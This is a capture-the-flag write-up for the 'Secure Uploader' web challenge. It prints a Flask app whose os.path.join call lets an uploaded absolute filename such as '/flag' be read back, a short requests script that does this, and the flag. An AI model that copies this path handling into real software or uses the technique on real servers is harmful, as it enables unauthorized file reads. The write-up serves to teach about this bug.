# Secure Uploader
## Web

The app is a simple file uploader. A form can be used to upload a file (the name cannot contain `.`), it is assigned an ID, then saved to disk, with a redirect allowing them to access the file.

```python
from flask import Flask, request, redirect, g
import sqlite3
import os

app = Flask(__name__)

SCHEMA = """CREATE TABLE files (
id integer primary key autoincrement,
path text unique
);
insert into files (path) values ("testing");
"""

def db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect("database.db")
    return db


@app.before_first_request
def setup():
    os.remove("database.db")
    cur = db().cursor()
    cur.executescript(SCHEMA)

@app.route('/')
def hello_world():
    return """<!DOCTYPE html>
<html>
<body>
<form action="/upload" method="post" enctype="multipart/form-data">
    Select image to upload:
    <input type="file" name="file">
    <input type="submit" value="Upload File" name="submit">
</form>

</body>
</html>"""


@app.route('/upload', methods=['POST'])
def upload():
    if 'file' not in request.files:
        return redirect('/')
    file = request.files['file']
    if "." in file.filename:
        return "Bad filename!", 403
    conn = db()
    cur = conn.cursor()
    try:
        cur.execute("insert into files (path) values (?)", (file.filename,))
    except sqlite3.IntegrityError:
        return "Duplicate file"
    conn.commit()
    file.save('uploads/' + file.filename)
    return redirect('/file/' + str(cur.lastrowid))

@app.route('/file/<id>')
def file(id):
    conn = db()
    cur = conn.cursor()
    cur.execute("select path from files where id=?", id)
    res = cur.fetchone()
    if res is None:
        return "File not found", 404
    with open(os.path.join("uploads/", res[0]), "r") as f:
        return f.read()

app.run(host='0.0.0.0')
```

The bug resides in the usage of `os.path.join`. According to the Python docs, 

> If a component is an absolute path, all previous components are thrown away and joining continues from the absolute path component.

For instance, `os.path.join("/home", "user", "/.bashrc")` returns `/.bashrc`. Using this, we can simply upload a file named `/flag` by intercepting the upload with Burp. Navigating to the returned page will access `/flag`, the location of the flag, which will be returned.

```python
#!/usr/bin/python3.8
import requests

URL = "http://localhost:1337/"

r = requests.post(URL + "upload", files={"file": ("/flag", "aa")})
print(r.text)
```

`rarctf{4lw4y5_r34d_th3_d0c5_pr0p3rly!-71ed16}`
